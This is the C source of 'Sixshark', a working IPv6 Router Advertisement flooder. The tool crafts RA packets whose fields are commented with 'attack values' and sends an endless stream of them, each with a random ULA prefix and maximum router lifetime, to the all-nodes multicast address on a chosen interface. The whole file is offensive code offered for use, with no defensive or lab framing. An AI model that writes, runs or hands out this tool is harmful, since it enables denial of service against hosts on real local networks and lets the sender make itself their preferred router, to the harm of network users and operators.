#ifdef __INTELLISENSE__
#pragma diag_suppress 70
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <getopt.h>
#include <unistd.h>
#include <signal.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>

// Data structures
// ICMPv6 Router Advertisement Header (16 bytes total)
// RFC 4861 Section 4.2
typedef struct ICMPv6
{
    uint8_t type;           // ICMPv6 message type (134 = Router Advertisement)
    uint8_t code;           // Message subtype (always 0 for RA)
    uint16_t checksum;      // ICMPv6 checksum (kernel auto-calculates, set to 0)
    
    // 4-byte data field - interpreted differently based on message type
    union 
    {
        uint32_t data32;    // Access all 4 bytes as single 32-bit value
        uint16_t data16[2]; // Access as two 16-bit values: [0]=hop+flags, [1]=lifetime
        uint8_t data8[4];   // Access as four 8-bit values: [0]=hop, [1]=flags, [2-3]=lifetime
    } data;
    // For Router Advertisement:
    //   data8[0] = Cur Hop Limit (suggested TTL for outgoing packets, typically 64)
    //   data8[1] = Flags (M=Managed, O=Other config, both 0 for pure SLAAC)
    //   data16[1] = Router Lifetime in seconds (0-65535, higher = more preferred)
    //               Attack value: 65535 (maximum priority)

    uint32_t r_time;        // Reachable time in milliseconds (0 = unspecified)
                            // How long a neighbor is considered reachable
                            // Attack value: 0 (don't care)
    
    uint32_t rtrans_time;   // Retransmit timer in milliseconds (0 = unspecified)  
                            // How long between neighbor solicitation retransmits
                            // Attack value: 0 (don't care)
} __attribute__((packed)) ICMPv6;

// Prefix Information Option (Type 3) - 32 bytes total
// RFC 4861 Section 4.6.2
// Tells clients what IPv6 prefix to use for address autoconfiguration
typedef struct PrefixInfo
{
    uint8_t type;               // Option type (3 = Prefix Information)
    uint8_t length;             // Length in units of 8 bytes (4 = 32 bytes total)
    uint8_t prefix_len;         // Prefix length in bits (typically 64 for SLAAC)
    uint8_t flags;              // Prefix flags:
                                //   0x80 (L bit) = On-link (prefix is on this network segment)
                                //   0x40 (A bit) = Autonomous (use for SLAAC address config)
                                //   Attack value: 0xC0 (both L and A set)
    
    uint32_t valid_lifetime;    // Seconds prefix is valid for address config
                                // Attack value: 86400 (24 hours) or 0xFFFFFFFF (infinite)
    
    uint32_t preferred_lifetime; // Seconds prefix is preferred for new connections
                                 // Attack value: 86400 (24 hours) or 0xFFFFFFFF (infinite)
    
    uint32_t reserved;          // Must be 0
    
    struct in6_addr prefix;     // The actual IPv6 prefix (128 bits / 16 bytes)
                                // Attack value: fd00:dead:beef:: (ULA range)
                                // Only first prefix_len bits matter (e.g., first 64 bits for /64)
} __attribute__((packed)) PrefixInfo;

// Source Link-Layer Address Option (Type 1) - 8 bytes total
// RFC 4861 Section 4.6.1
// Provides router's MAC address so clients can send packets without doing ND
typedef struct SourceLLAddr
{
    uint8_t type;       // Option type (1 = Source Link-Layer Address)
    uint8_t length;     // Length in units of 8 bytes (1 = 8 bytes total)
    uint8_t mac[6];     // MAC address of the router (your attacker MAC)
                        // Attack value: your interface's actual MAC address
} __attribute__((packed)) SourceLLAddr;


// Complete Router Advertisement Packet Structure
// Total size: 16 (ICMPv6) + 32 (Prefix) + 8 (Source LL) = 56 bytes
typedef struct Packet
{
    ICMPv6 icmp6_hdr;       // Router Advertisement header
    PrefixInfo prefix;      // Advertised IPv6 prefix for autoconfiguration
    SourceLLAddr source_ll; // Router's MAC address
} __attribute__((packed)) Packet;

/*
 * Attack Configuration Summary:
 * 
 * ICMPv6 Header:
 *   - type: 134
 *   - code: 0
 *   - checksum: 0 (kernel fills this)
 *   - data8[0] (hop limit): 64
 *   - data8[1] (flags): 0 (M=0, O=0 for pure RA attack)
 *   - data16[1] (router lifetime): 65535 (maximum priority)
 *   - r_time: 0
 *   - rtrans_time: 0
 * 
 * Prefix Option:
 *   - type: 3
 *   - length: 4
 *   - prefix_len: 64
 *   - flags: 0xC0 (L=1, A=1)
 *   - valid_lifetime: 86400 (24 hours)
 *   - preferred_lifetime: 86400 (24 hours)
 *   - reserved: 0
 *   - prefix: fd00:dead:beef:: (or user-specified)
 * 
 * Source LL Option:
 *   - type: 1
 *   - length: 1
 *   - mac: [your interface MAC]
 */

// Function prototypes

void print_usage(const char *progname);
void stop(int sig);
void cleanup(Packet *p);
int lookup_mac(const char *interface, uint8_t *mac);
int create_packet(Packet *p, const uint8_t *mac, const char *prefix);
int generate_random_prefix(char *prefix);
int run_flood(Packet *p, int delay, const char *interface, bool progress);

// Global state

volatile sig_atomic_t keep_running = 1;


int main(int argc, char *argv[])
{
    printf("Sixshark - IPv6 RA Flooder\n");

    if(getuid() != 0)
    {
        fprintf(stderr, "Error: Sixshark requires root privileges\n");
        fprintf(stderr, "Try: sudo %s -i <interface>\n", argv[0]);
        return 1;
    }

    signal(SIGINT, stop);
    srand(time(NULL));
    
    int opt;
    char *interface = NULL;
    int delay = 0;
    bool progress = false;

    while((opt = getopt(argc, argv, "i:d:ph")) != -1)
    {
        switch(opt)
        {
            case 'h':
                print_usage(argv[0]);
                return 0;
            case 'i':
                interface = optarg;
                break;
            case 'd':
                delay = atoi(optarg);
                if(delay < 0)
                {
                    fprintf(stderr, "Error: -d requires a positive integer.\n");
                    exit(1);
                }
                break;
            case 'p':
                progress = true;
                break;
        }
    }

    if(!interface)
    {
        fprintf(stderr, "Error: Interface is required!\n\n");
        print_usage(argv[0]);
        return 1;
    }

    Packet *p = malloc(sizeof(Packet));

    if(!p)
    {
        perror("malloc");
        return 1;
    }

    printf("Interface: %s\n", interface);
    printf("Flooding network...\n");
    printf("Press Ctrl+C to stop flooding.\n\n");
    run_flood(p, delay, interface, progress);
    cleanup(p);
    return 0;
}

int lookup_mac(const char *interface, uint8_t *mac)
{
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    struct ifreq ifr;
    if(sock < 0)
    {
        perror("socket");
        return 0;
    }

    strncpy(ifr.ifr_name, interface, IF_NAMESIZE - 1);
    ifr.ifr_name[IF_NAMESIZE - 1] = '\0';

    if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("ioctl");
        close(sock);
        return 0;
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return 1;
}

int generate_random_prefix(char *prefix)
{
    snprintf(prefix, INET6_ADDRSTRLEN, "fd%02x:%04x:%04x::", 
         rand() % 256, 
         rand() % 65536, 
         rand() % 65536);
    return 0;
}

int create_packet(Packet *p, const uint8_t *mac, const char *prefix)
{
    p->icmp6_hdr.type = 134;
    p->icmp6_hdr.code = 0;
    p->icmp6_hdr.checksum = 0;

    p->icmp6_hdr.data.data8[0] = 64;
    p->icmp6_hdr.data.data8[1] = 0;
    p->icmp6_hdr.data.data16[1] = htons(65535);

    p->icmp6_hdr.r_time = htonl(0);
    p->icmp6_hdr.rtrans_time = htonl(0);

    p->prefix.type = 3;
    p->prefix.length = 4;
    p->prefix.prefix_len = 64;
    p->prefix.flags = 0xC0;
    p->prefix.valid_lifetime = htonl(86400);
    p->prefix.preferred_lifetime = htonl(86400);
    p->prefix.reserved = 0;

    if(inet_pton(AF_INET6, prefix, &p->prefix.prefix) != 1)
    {
        fprintf(stderr, "Error: Invalid IPv6 prefix: %s\n", prefix);
        return 0;
    }

    p->source_ll.type = 1;
    p->source_ll.length = 1;

    memcpy(p->source_ll.mac, mac, 6);
    return 1;
}

int run_flood(Packet *p, int delay, const char *interface, bool progress)
{
    int hops = 255;
    int bufsize = 1024 * 1024;
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    if(sock < 0)
    {
        perror("socket");
        return 1;
    }

    if(setsockopt(sock, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &hops, sizeof(hops)) < 0)
    {
        perror("setsockopt IPV6_UNICAST_HOPS");
        close(sock);
        return 1;
    }
    if(setsockopt(sock, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops, sizeof(hops)) < 0)
    {
        perror("setsockopt IPV6_MULTICAST_HOPS");
        close(sock);
        return 1;
    }
    
    if(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0)
    {
        perror("setsockopt SO_SNDBUF");
        close(sock);
        return 1;
    }

    char prefix[INET6_ADDRSTRLEN];
    uint8_t mac[6];

    if(!lookup_mac(interface, mac))
    {
        fprintf(stderr, "Error: Could not find MAC address for interface %s.\n", interface);
        close(sock);
        return 1;
    }

    struct sockaddr_in6 dest;
    memset(&dest, 0, sizeof(dest));

    dest.sin6_family = AF_INET6;
    inet_pton(AF_INET6, "ff02::1", &dest.sin6_addr);
    dest.sin6_scope_id = if_nametoindex(interface);

    if(dest.sin6_scope_id == 0)
    {
        fprintf(stderr, "Error: Could not find interface %s.\n", interface);
        close(sock);
        return 1;
    }

    while(keep_running)
    {
        generate_random_prefix(prefix);
        memset(p, 0, sizeof(Packet));

        if(!create_packet(p, mac, prefix))
        {
            close(sock);
            return 1;
        }

        int bytes_sent = sendto(sock, p, sizeof(Packet), 0, (struct sockaddr *)&dest, sizeof(dest));
        if(bytes_sent < 0)
        {
            if(errno == ENOBUFS)
            {
                usleep(1000);
                continue;
            }
            perror("sendto");
            close(sock);
            return 1;
        }
        if(progress)
        {
            printf(".");
            fflush(stdout);
        }
        sleep(delay);
    }

    close(sock);
    return 1;
}

void stop(int sig)
{
    keep_running = 0;
}

void cleanup(Packet *p)
{
    printf("\n\nCleaning up...");
    free(p);
    printf(" [OK]\n");
}

void print_usage(const char *progname)
{
    printf("Sixshark - IPv6 RA Flooder\n\n");
    printf("Usage: sudo %s -i <interface> [-d -p -h]\n", progname);
    printf("\n");
    printf("Required:\n");
    printf(" -i <interface>  Network interface to use (e.g., eth0, wlan0)\n");
    printf("\n");
    printf("Options:\n");
    printf(" -d <int>   Delay between sending packets (in seconds)\n");
    printf(" -p         Print to screen when packet is sent\n");
    printf(" -h         Display this help message\n");
    printf("\n");
    printf("Press Ctrl+C to stop flooding.\n");
}